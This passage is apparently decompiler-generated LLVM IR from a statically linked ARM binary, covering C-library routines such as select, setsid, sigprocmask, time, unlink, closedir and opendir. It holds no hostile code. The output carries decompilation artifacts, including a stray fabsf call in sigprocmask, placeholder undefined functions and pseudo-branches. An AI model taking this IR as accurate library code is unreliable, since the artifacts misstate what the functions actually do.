  %v2_108f4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_108f4

dec_label_pc_108f4:                               ; preds = %entry, %dec_label_pc_108dc
  %v1_108f8 = phi i32 [ %v0_108cc, %entry ], [ -1, %dec_label_pc_108dc ]
  %v2_108f4 = phi i32 [ %v3_108c0, %entry ], [ %v2_108f4.pre, %dec_label_pc_108dc ]
  store i32 %v2_108f4, i32* @r7, align 4
  ret i32 %v1_108f8

; uselistorder directives
  uselistorder i32 %v0_108cc, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_108f4, { 1, 0 }
}

define i32 @__syscall_select() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_10900 = load i32, i32* @r4, align 4
  store i32 %v3_10900, i32* %stack_var_-12, align 4
  %v0_10910 = load i32, i32* @r0, align 4
  store i32 %v0_10910, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10910, -4095
  br i1 %tmp, label %dec_label_pc_10938, label %dec_label_pc_10920

dec_label_pc_10920:                               ; preds = %entry
  %v0_10924 = call i32 @__aeabi_read_tp()
  %v3_10928 = load i16, i16* @global_var_21510.336, align 2
  %v4_10928 = sext i16 %v3_10928 to i32
  %v0_1092c = load i32, i32* %r2.global-to-local, align 4
  %v1_1092c = sub i32 0, %v0_1092c
  store i32 %v1_1092c, i32* %r2.global-to-local, align 4
  %v3_10930 = add i32 %v4_10928, %v0_10924
  %v4_10930 = inttoptr i32 %v3_10930 to i32*
  store i32 %v1_1092c, i32* %v4_10930, align 4
  %v2_10938.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_10938

dec_label_pc_10938:                               ; preds = %entry, %dec_label_pc_10920
  %v1_1093c = phi i32 [ %v0_10910, %entry ], [ -1, %dec_label_pc_10920 ]
  %v2_10938 = phi i32 [ %v3_10900, %entry ], [ %v2_10938.pre, %dec_label_pc_10920 ]
  store i32 %v2_10938, i32* @r4, align 4
  ret i32 %v1_1093c

; uselistorder directives
  uselistorder i32 %v0_10910, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10938, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_10944 = load i32, i32* @r4, align 4
  store i32 %v3_10944, i32* %stack_var_-28, align 4
  %v6_10944 = load i32, i32* @r5, align 4
  %v9_10944 = load i32, i32* @r6, align 4
  %v12_10944 = load i32, i32* @r7, align 4
  %v15_10944 = load i32, i32* @r8, align 4
  %v18_10944 = load i32, i32* @sl, align 4
  %v21_10944 = load i32, i32* @lr, align 4
  %v4_10954 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 12772) to i32*), align 4
  %v2_1095c = icmp eq i32 %v4_10954, 0
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_1095c, label %dec_label_pc_10978, label %entry.dec_label_pc_10984_crit_edge

entry.dec_label_pc_10984_crit_edge:               ; preds = %entry
  br label %dec_label_pc_10984

dec_label_pc_10978:                               ; preds = %entry
  store i32 %v3_10944, i32* @r4, align 4
  store i32 %v9_10944, i32* @r6, align 4
  store i32 %v12_10944, i32* @r7, align 4
  store i32 %v15_10944, i32* @r8, align 4
  store i32 %v18_10944, i32* %sl.global-to-local, align 4
  %v0_10980 = call i32 @__syscall_select()
  br label %dec_label_pc_10984

dec_label_pc_10984:                               ; preds = %entry.dec_label_pc_10984_crit_edge, %dec_label_pc_10978
  %v0_10984 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_10984, i32* @r5, align 4
  %v0_10998 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_10998, i32* @r0, align 4
  %v0_109a0 = call i32 @__syscall_select()
  store i32 %v0_109a0, i32* @r4, align 4
  %v0_109a8 = load i32, i32* @r5, align 4
  %v1_109ac = call i32 @__libc_disable_asynccancel(i32 %v0_109a8)
  %v0_109b0 = load i32, i32* @r4, align 4
  %v2_109b8 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_109b8, i32* @r4, align 4
  store i32 %v6_10944, i32* @r5, align 4
  store i32 %v9_10944, i32* @r6, align 4
  store i32 %v12_10944, i32* @r7, align 4
  store i32 %v15_10944, i32* @r8, align 4
  store i32 %v18_10944, i32* @sl, align 4
  store i32 %v21_10944, i32* @lr, align 4
  ret i32 %v0_109b0

; uselistorder directives
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10984, { 1, 0 }
}

define i32 @__GI_setsid(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_109c8 = load i32, i32* @r7, align 4
  store i32 %v3_109c8, i32* %stack_var_-8, align 4
  %v0_109d4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_109d4, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_109d4, -4095
  br i1 %tmp, label %dec_label_pc_109fc, label %dec_label_pc_109e4

dec_label_pc_109e4:                               ; preds = %entry
  %v0_109e8 = call i32 @__aeabi_read_tp()
  %v3_109ec = load i16, i16* @global_var_21510.336, align 2
  %v4_109ec = sext i16 %v3_109ec to i32
  %v0_109f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_109f0 = sub i32 0, %v0_109f0
  store i32 %v1_109f0, i32* %r2.global-to-local, align 4
  %v3_109f4 = add i32 %v4_109ec, %v0_109e8
  %v4_109f4 = inttoptr i32 %v3_109f4 to i32*
  store i32 %v1_109f0, i32* %v4_109f4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_109fc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_109fc

dec_label_pc_109fc:                               ; preds = %entry, %dec_label_pc_109e4
  %v1_10a00 = phi i32 [ %v0_109d4, %entry ], [ -1, %dec_label_pc_109e4 ]
  %v2_109fc = phi i32 [ %v3_109c8, %entry ], [ %v2_109fc.pre, %dec_label_pc_109e4 ]
  store i32 %v2_109fc, i32* @r7, align 4
  ret i32 %v1_10a00

; uselistorder directives
  uselistorder i32 %v0_109d4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_109fc, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_10a0c = icmp eq i32* %arg2, null
  br i1 %v2_10a0c, label %dec_label_pc_10a50, label %dec_label_pc_10a20

dec_label_pc_10a20:                               ; preds = %entry
  %v2_10a20 = load i32, i32* %arg2, align 4
  %v1_10a24 = icmp slt i32 %v2_10a20, 0
  br i1 %v1_10a24, label %dec_label_pc_10a38, label %dec_label_pc_10a2c

dec_label_pc_10a2c:                               ; preds = %dec_label_pc_10a20
  %tmp = ptrtoint i32* %arg2 to i32
  %.pre = add i32 %tmp, 4
  %.pre3 = inttoptr i32 %.pre to i32*
  %v3_10a2c = load i32, i32* %.pre3, align 4
  %v1_10a30 = urem i32 %v3_10a2c, 2
  %v2_10a30 = icmp eq i32 %v1_10a30, 0
  br i1 %v2_10a30, label %dec_label_pc_10a50, label %dec_label_pc_10a38

dec_label_pc_10a38:                               ; preds = %dec_label_pc_10a20, %dec_label_pc_10a2c
  %v2_10a38 = load i32, i32* %arg2, align 4
  %tmp9 = bitcast i32 %v2_10a38 to float
  %tmp10 = call float @fabsf(float %tmp9)
  br label %dec_label_pc_10a50

dec_label_pc_10a50:                               ; preds = %dec_label_pc_10a2c, %entry, %dec_label_pc_10a38
  %tmp11 = icmp ult i32 %arg1, -4095
  br i1 %tmp11, label %dec_label_pc_10a84, label %dec_label_pc_10a6c

dec_label_pc_10a6c:                               ; preds = %dec_label_pc_10a50
  %v1_10a70 = sub i32 0, %arg1
  %v3_10a74 = load i16, i16* @global_var_21510.336, align 2
  %v4_10a74 = sext i16 %v3_10a74 to i32
  %v0_10a78 = call i32 @__aeabi_read_tp()
  %v3_10a7c = add i32 %v4_10a74, %v0_10a78
  %v4_10a7c = inttoptr i32 %v3_10a7c to i32*
  store i32 %v1_10a70, i32* %v4_10a7c, align 4
  br label %dec_label_pc_10a84

dec_label_pc_10a84:                               ; preds = %dec_label_pc_10a50, %dec_label_pc_10a6c
  %v1_10a8c = phi i32 [ %arg1, %dec_label_pc_10a50 ], [ -1, %dec_label_pc_10a6c ]
  ret i32 %v1_10a8c

; uselistorder directives
  uselistorder i32* %arg2, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10a84, { 1, 0 }
  uselistorder label %dec_label_pc_10a50, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10a38, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_10a98 = ptrtoint i32* %stack_var_-16 to i32
  store i32 0, i32* @r1, align 4
  %v2_10aa8 = call i32 @gettimeofday(i32 %v2_10a98, i32 0)
  %v2_10aac = load i32, i32* %stack_var_-16, align 4
  %v2_10ab0 = icmp eq i32* %arg1, null
  br i1 %v2_10ab0, label %bb6, label %bb

bb:                                               ; preds = %entry
  store i32 %v2_10aac, i32* %arg1, align 4
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  ret i32 %v2_10aac

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @unlink(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10ac4 = load i32, i32* @r7, align 4
  store i32 %v3_10ac4, i32* %stack_var_-8, align 4
  %v0_10ad0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10ad0, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10ad0, -4095
  br i1 %tmp, label %dec_label_pc_10af8, label %dec_label_pc_10ae0

dec_label_pc_10ae0:                               ; preds = %entry
  %v0_10ae4 = call i32 @__aeabi_read_tp()
  %v3_10ae8 = load i16, i16* @global_var_21510.336, align 2
  %v4_10ae8 = sext i16 %v3_10ae8 to i32
  %v0_10aec = load i32, i32* %r2.global-to-local, align 4
  %v1_10aec = sub i32 0, %v0_10aec
  store i32 %v1_10aec, i32* %r2.global-to-local, align 4
  %v3_10af0 = add i32 %v4_10ae8, %v0_10ae4
  %v4_10af0 = inttoptr i32 %v3_10af0 to i32*
  store i32 %v1_10aec, i32* %v4_10af0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10af8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10af8

dec_label_pc_10af8:                               ; preds = %entry, %dec_label_pc_10ae0
  %v1_10afc = phi i32 [ %v0_10ad0, %entry ], [ -1, %dec_label_pc_10ae0 ]
  %v2_10af8 = phi i32 [ %v3_10ac4, %entry ], [ %v2_10af8.pre, %dec_label_pc_10ae0 ]
  store i32 %v2_10af8, i32* @r7, align 4
  ret i32 %v1_10afc

; uselistorder directives
  uselistorder i32 %v0_10ad0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10af8, { 1, 0 }
}

define i32 @__GI_closedir(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_10b04 = load i32, i32* @r4, align 4
  store i32 %v3_10b04, i32* %stack_var_-24, align 4
  %v9_10b04 = load i32, i32* @r6, align 4
  %v12_10b04 = load i32, i32* @r7, align 4
  %v15_10b04 = load i32, i32* @r8, align 4
  %v18_10b04 = load i32, i32* @lr, align 4
  %v2_10b08 = load i32, i32* %arg1, align 4
  store i32 %v2_10b08, i32* %r3.global-to-local, align 4
  %v3_10b10 = icmp eq i32 %v2_10b08, -1
  store i32 %tmp, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* @r6, align 4
  br i1 %v3_10b10, label %dec_label_pc_10b24, label %dec_label_pc_10b40

dec_label_pc_10b24:                               ; preds = %entry
  store i32 68060, i32* %r2.global-to-local, align 4
  %v0_10b28 = call i32 @__aeabi_read_tp()
  %v3_10b2c = load i16, i16* @global_var_21510.336, align 2
  %v4_10b2c = sext i16 %v3_10b2c to i32
  store i32 %v4_10b2c, i32* %r2.global-to-local, align 4
  %v0_10b30 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_10b30, i32* %r1.global-to-local, align 4
  %v1_10b34 = add i32 %v0_10b30, 10
  store i32 %v1_10b34, i32* %r3.global-to-local, align 4
  %v3_10b38 = add i32 %v4_10b2c, %v0_10b28
  %v4_10b38 = inttoptr i32 %v3_10b38 to i32*
  store i32 %v1_10b34, i32* %v4_10b38, align 4
  %v0_10be8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10be8

dec_label_pc_10b40:                               ; preds = %entry
  store i32 68, i32* %r3.global-to-local, align 4
  %v1_10b44 = add i32 %tmp, 24
  store i32 %v1_10b44, i32* %r2.global-to-local, align 4
  %v4_10b4c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 68) to i32*), align 4
  store i32 %v4_10b4c, i32* %r1.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_10b58 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_10b58)
  store i32 -1, i32* @r8, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_10b70 = load i32, i32* @r6, align 4
  %v2_10b70 = add i32 %v0_10b70, 16
  %v3_10b70 = inttoptr i32 %v2_10b70 to i32*
  %v4_10b70 = load i32, i32* %v3_10b70, align 4
  call void @__pseudo_branch(i32 %v4_10b70)
  %v0_10b7c = load i32, i32* @r7, align 4
  %v1_10b7c = inttoptr i32 %v0_10b7c to i32*
  %v2_10b7c = load i32, i32* %v1_10b7c, align 4
  store i32 %v2_10b7c, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_10b8c = load i32, i32* @r8, align 4
  store i32 %v0_10b8c, i32* %v1_10b7c, align 4
  %v0_10b90 = load i32, i32* @r6, align 4
  %v1_10b90 = load i32, i32* %r3.global-to-local, align 4
  %v2_10b90 = add i32 %v1_10b90, %v0_10b90
  %v3_10b90 = inttoptr i32 %v2_10b90 to i32*
  %v4_10b90 = load i32, i32* %v3_10b90, align 4
  store i32 ptrtoint (i32* @global_var_10b9c.364 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_10b90)
  %v0_10b9c = load i32, i32* @r7, align 4
  %v1_10b9c = add i32 %v0_10b9c, 12
  %v2_10b9c = inttoptr i32 %v1_10b9c to i32*
  %v3_10b9c = load i32, i32* %v2_10b9c, align 4
  store i32 %v3_10b9c, i32* @r0, align 4
  %v0_10ba0 = call i32 @free()
  %v0_10ba4 = load i32, i32* @r7, align 4
  store i32 %v0_10ba4, i32* @r0, align 4
  %v0_10ba8 = call i32 @free()
  %v0_10bb0 = load i32, i32* @r4, align 4
  store i32 %v0_10bb0, i32* %r2.global-to-local, align 4
  %tmp11 = icmp ult i32 %v0_10bb0, -4095
  br i1 %tmp11, label %dec_label_pc_10be4, label %dec_label_pc_10bcc

dec_label_pc_10bcc:                               ; preds = %dec_label_pc_10b40
  store i32 67892, i32* %r3.global-to-local, align 4
  %v0_10bd0 = call i32 @__aeabi_read_tp()
  %v3_10bd4 = load i16, i16* @global_var_21510.336, align 2
  %v4_10bd4 = sext i16 %v3_10bd4 to i32
  store i32 %v4_10bd4, i32* %r3.global-to-local, align 4
  %v0_10bd8 = load i32, i32* %r2.global-to-local, align 4
  %v1_10bd8 = sub i32 0, %v0_10bd8
  store i32 %v1_10bd8, i32* %r2.global-to-local, align 4
  %v3_10bdc = add i32 %v4_10bd4, %v0_10bd0
  %v4_10bdc = inttoptr i32 %v3_10bdc to i32*
  store i32 %v1_10bd8, i32* %v4_10bdc, align 4
  %v0_10be0 = load i32, i32* @r8, align 4
  br label %dec_label_pc_10be4

dec_label_pc_10be4:                               ; preds = %dec_label_pc_10b40, %dec_label_pc_10bcc
  %v0_10be4 = phi i32 [ %v0_10bb0, %dec_label_pc_10b40 ], [ %v0_10be0, %dec_label_pc_10bcc ]
  store i32 %v0_10be4, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10be8

dec_label_pc_10be8:                               ; preds = %dec_label_pc_10b24, %dec_label_pc_10be4
  %v0_10be8 = phi i32 [ %v0_10be8.pre, %dec_label_pc_10b24 ], [ %v0_10be4, %dec_label_pc_10be4 ]
  %v2_10bf0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_10bf0, i32* @r4, align 4
  store i32 %v9_10b04, i32* @r6, align 4
  store i32 %v12_10b04, i32* @r7, align 4
  store i32 %v15_10b04, i32* @r8, align 4
  store i32 %v18_10b04, i32* @lr, align 4
  ret i32 %v0_10be8

; uselistorder directives
  uselistorder i32 %v0_10bb0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10be8, { 1, 0 }
  uselistorder label %dec_label_pc_10be4, { 1, 0 }
}

define i32 @function_10c00(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10c00:
  %v0_10c00 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10c00, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_10c00
  %v2_10c00 = load i32, i32* @r4, align 4
  %v3_10c10 = load i32, i32* @sb, align 4
  %v8_10c10 = lshr i32 %v2_10c00, %v3_10c10
  %v9_10c10 = and i32 %v8_10c10, %arg2
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_10c00, %bb
  %v10_10c10 = phi i32 [ %arg1, %dec_label_pc_10c00 ], [ %v9_10c10, %bb ]
  ret i32 %v10_10c10

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @fd_to_DIR(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_10c14 = load i32, i32* @r4, align 4
  %v6_10c14 = load i32, i32* @r5, align 4
  %v9_10c14 = load i32, i32* @r6, align 4
  %v12_10c14 = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 48, i32* @r0, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_10c28 = call i32 @malloc()
  %v2_10c30 = icmp eq i32 %v0_10c28, 0
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* @r6, align 4
  br i1 %v2_10c30, label %bb, label %dec_label_pc_10c40

bb:                                               ; preds = %entry
  br label %dec_label_pc_10ccc

dec_label_pc_10c40:                               ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_10c44 = load i32, i32* @r4, align 4
  %v2_10c44 = icmp ugt i32 %v0_10c44, 511
  %v2_10c48 = add i32 %v0_10c28, 4
  %v3_10c48 = inttoptr i32 %v2_10c48 to i32*
  store i32 0, i32* %v3_10c48, align 4
  %v0_10c4c = load i32, i32* %r3.global-to-local, align 4
  %v2_10c4c = add i32 %v0_10c28, 16
  %v3_10c4c = inttoptr i32 %v2_10c4c to i32*
  store i32 %v0_10c4c, i32* %v3_10c4c, align 4
  %v0_10c50 = load i32, i32* %r3.global-to-local, align 4
  %v2_10c50 = add i32 %v0_10c28, 8
  %v3_10c50 = inttoptr i32 %v2_10c50 to i32*
  store i32 %v0_10c50, i32* %v3_10c50, align 4
  br i1 %v2_10c44, label %.thread, label %bb16

.thread:                                          ; preds = %dec_label_pc_10c40
  %v0_10c582 = load i32, i32* @r4, align 4
  %v2_10c583 = add i32 %v0_10c28, 20
  %v3_10c584 = inttoptr i32 %v2_10c583 to i32*
  store i32 %v0_10c582, i32* %v3_10c584, align 4
  br label %bb17

bb16:                                             ; preds = %dec_label_pc_10c40
  %v1_10c54 = load i32, i32* %r3.global-to-local, align 4
  %v2_10c54 = add i32 %v1_10c54, 512
  store i32 %v2_10c54, i32* %r3.global-to-local, align 4
  %v0_10c58 = load i32, i32* @r4, align 4
  %v2_10c58 = add i32 %v0_10c28, 20
  %v3_10c58 = inttoptr i32 %v2_10c58 to i32*
  store i32 %v0_10c58, i32* %v3_10c58, align 4
  %v1_10c5c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_10c5c, i32* %v3_10c58, align 4
  br label %bb17

bb17:                                             ; preds = %.thread, %bb16
  store i32 %v0_10c28, i32* @r5, align 4
  %v0_10c64 = load i32, i32* @r7, align 4
  %v2_10c64 = inttoptr i32 %v0_10c28 to i32*
  store i32 %v0_10c64, i32* %v2_10c64, align 4
  %v0_10c68 = load i32, i32* @r5, align 4
  %v1_10c68 = add i32 %v0_10c68, 20
  %v2_10c68 = inttoptr i32 %v1_10c68 to i32*
  %v3_10c68 = load i32, i32* %v2_10c68, align 4
  store i32 %v3_10c68, i32* %r1.global-to-local, align 4
  %v2_10c70 = call i32 @calloc(i32 1, i32 %v3_10c68)
  %v2_10c74 = icmp eq i32 %v2_10c70, 0
  store i32 %v2_10c70, i32* @r4, align 4
  %v1_10c7c = load i32, i32* @r5, align 4
  %v2_10c7c = add i32 %v1_10c7c, 12
  %v3_10c7c = inttoptr i32 %v2_10c7c to i32*
  store i32 %v2_10c70, i32* %v3_10c7c, align 4
  br i1 %v2_10c74, label %dec_label_pc_10c84, label %dec_label_pc_10c94

dec_label_pc_10c84:                               ; preds = %bb17
  %v0_10c84 = load i32, i32* @r5, align 4
  store i32 %v0_10c84, i32* @r0, align 4
  %v0_10c88 = call i32 @free()
  %v0_10c8c = load i32, i32* @r4, align 4
  br label %dec_label_pc_10ccc

dec_label_pc_10c94:                               ; preds = %bb17
  %v0_10c98 = load i32, i32* @r6, align 4
  %v2_10c98 = add i32 %v0_10c98, -34036
  store i32 %v2_10c98, i32* %r3.global-to-local, align 4
  %v1_10ca0 = inttoptr i32 %v2_10c98 to i32*
  %v2_10ca0 = load i32, i32* %v1_10ca0, align 4
  %v3_10ca0 = add i32 %v0_10c98, -34032
  %v4_10ca0 = inttoptr i32 %v3_10ca0 to i32*
  %v5_10ca0 = load i32, i32* %v4_10ca0, align 4
  store i32 %v5_10ca0, i32* %r1.global-to-local, align 4
  %v6_10ca0 = add i32 %v0_10c98, -34028
  %v7_10ca0 = inttoptr i32 %v6_10ca0 to i32*
  %v8_10ca0 = load i32, i32* %v7_10ca0, align 4
  store i32 %v8_10ca0, i32* %r2.global-to-local, align 4
  %v9_10ca0 = add i32 %v0_10c98, -34024
  %v10_10ca0 = inttoptr i32 %v9_10ca0 to i32*
  %v11_10ca0 = load i32, i32* %v10_10ca0, align 4
  store i32 %v11_10ca0, i32* %r3.global-to-local, align 4
  %v12_10ca0 = add i32 %v0_10c98, -34020
  %v1_10cac = inttoptr i32 %v12_10ca0 to i32*
  %v2_10cac = load i32, i32* %v1_10cac, align 4
  %v3_10cac = add i32 %v0_10c98, -34016
  %v4_10cac = inttoptr i32 %v3_10cac to i32*
  %v5_10cac = load i32, i32* %v4_10cac, align 4
  store i32 %v2_10cac, i32* %stack_var_-32, align 4
  store i32 %v5_10ca0, i32* %r1.global-to-local, align 4
  store i32 %v8_10ca0, i32* %r2.global-to-local, align 4
  store i32 %v11_10ca0, i32* %r3.global-to-local, align 4
  %v0_10cbc = load i32, i32* @r5, align 4
  %v1_10cbc = add i32 %v0_10cbc, 24
  %v1_10cc0 = inttoptr i32 %v1_10cbc to i32*
  store i32 %v2_10ca0, i32* %v1_10cc0, align 4
  %v3_10cc0 = add i32 %v0_10cbc, 28
  %v4_10cc0 = inttoptr i32 %v3_10cc0 to i32*
  %v5_10cc0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_10cc0, i32* %v4_10cc0, align 4
  %v6_10cc0 = add i32 %v0_10cbc, 32
  %v7_10cc0 = inttoptr i32 %v6_10cc0 to i32*
  %v8_10cc0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_10cc0, i32* %v7_10cc0, align 4
  %v9_10cc0 = add i32 %v0_10cbc, 36
  %v10_10cc0 = inttoptr i32 %v9_10cc0 to i32*
  %v11_10cc0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_10cc0, i32* %v10_10cc0, align 4
  %v12_10cc0 = add i32 %v0_10cbc, 40
  %v2_10cc4 = load i32, i32* %stack_var_-32, align 4
  store i32 %v5_10cac, i32* %r1.global-to-local, align 4
  %v1_10cc8 = inttoptr i32 %v12_10cc0 to i32*
  store i32 %v2_10cc4, i32* %v1_10cc8, align 4
  %v3_10cc8 = add i32 %v0_10cbc, 44
  %v4_10cc8 = inttoptr i32 %v3_10cc8 to i32*
  %v5_10cc8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_10cc8, i32* %v4_10cc8, align 4
  %v0_10ccc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10ccc

dec_label_pc_10ccc:                               ; preds = %bb, %dec_label_pc_10c84, %dec_label_pc_10c94
  %v0_10ccc = phi i32 [ 0, %bb ], [ %v0_10c8c, %dec_label_pc_10c84 ], [ %v0_10ccc.pre, %dec_label_pc_10c94 ]
  store i32 %v3_10c14, i32* @r4, align 4
  store i32 %v6_10c14, i32* @r5, align 4
  store i32 %v9_10c14, i32* @r6, align 4
  store i32 %v12_10c14, i32* @r7, align 4
  ret i32 %v0_10ccc

; uselistorder directives
  uselistorder i32 %v2_10c70, { 1, 0, 2 }
  uselistorder i32 %v0_10c28, { 2, 1, 6, 0, 5, 4, 3, 7 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 512, { 7, 4, 0, 5, 8, 1, 9, 2, 10, 3, 11, 6, 12 }
  uselistorder label %dec_label_pc_10ccc, { 2, 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__GI_opendir(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-96 = alloca i32, align 4
  %v3_10ce4 = load i32, i32* @r7, align 4
  store i32 542720, i32* %r1.global-to-local, align 4
  %v2_10cec = ptrtoint i32* %stack_var_-96 to i32
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp6 = icmp ult i32 %arg1, -4095
  br i1 %tmp6, label %dec_label_pc_10d1c, label %dec_label_pc_10d04

dec_label_pc_10d04:                               ; preds = %entry
  %v0_10d08 = call i32 @__aeabi_read_tp()
  %v3_10d0c = load i16, i16* @global_var_21510.336, align 2
  %v4_10d0c = sext i16 %v3_10d0c to i32
  %v0_10d10 = load i32, i32* %r2.global-to-local, align 4
  %v1_10d10 = sub i32 0, %v0_10d10
  store i32 %v1_10d10, i32* %r2.global-to-local, align 4
  %v3_10d14 = add i32 %v4_10d0c, %v0_10d08
  %v4_10d14 = inttoptr i32 %v3_10d14 to i32*
  store i32 %v1_10d10, i32* %v4_10d14, align 4
  br label %dec_label_pc_10d40

dec_label_pc_10d1c:                               ; preds = %entry
  store i32 %arg1, i32* @r7, align 4
  %v1_10d1c = icmp slt i32 %arg1, 0
  br i1 %v1_10d1c, label %dec_label_pc_10d40, label %dec_label_pc_10d24

dec_label_pc_10d24:                               ; preds = %dec_label_pc_10d1c
  store i32 %v2_10cec, i32* @r1, align 4
  %v0_10d28 = call i32 @fstat()
  %v1_10d2c = icmp slt i32 %v0_10d28, 0
  br i1 %v1_10d2c, label %dec_label_pc_10d34, label %dec_label_pc_10d48

dec_label_pc_10d34:                               ; preds = %dec_label_pc_10d24
  br label %dec_label_pc_10d40

dec_label_pc_10d40:                               ; preds = %dec_label_pc_10d34, %dec_label_pc_10d1c, %dec_label_pc_10d04
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10d8c

dec_label_pc_10d48:                               ; preds = %dec_label_pc_10d24
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_10d50 = load i32, i32* @r7, align 4
  %v3_10d54 = call i32 @__GI___fcntl_nocancel(i32 %v0_10d50, i32 2, i32 1)
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_10d5c = load i32, i32* @r7, align 4
  %v2_10d60 = call i32 @fd_to_DIR(i32 %v0_10d5c, i32 %tmp)
  store i32 %v2_10d60, i32* %r1.global-to-local, align 4
  %v2_10d64 = icmp eq i32 %v2_10d60, 0
  br i1 %v2_10d64, label %dec_label_pc_10d6c, label %dec_label_pc_10d8c

dec_label_pc_10d6c:                               ; preds = %dec_label_pc_10d48
  %v0_10d7c = call i32 @__aeabi_read_tp()
